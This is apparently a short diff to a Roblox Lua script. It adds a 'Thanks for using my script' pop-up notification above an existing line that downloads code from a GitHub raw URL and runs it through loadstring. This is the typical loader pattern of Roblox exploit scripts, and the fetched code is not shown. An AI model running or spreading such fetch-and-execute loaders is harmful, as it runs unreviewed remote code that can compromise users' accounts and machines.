@@ -1,1 +1,10 @@
+local StarterGui = game:GetService("StarterGui")
+
+StarterGui:SetCore("SendNotification", {
+    Title = "Notification",
+    Text = "Thanks for using my script<3",
+    Duration = 5,
+    Button1 = "Ok! ",
+})
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Nguyennguyenquockha/SeyOP/refs/heads/main/Test.txt"))()
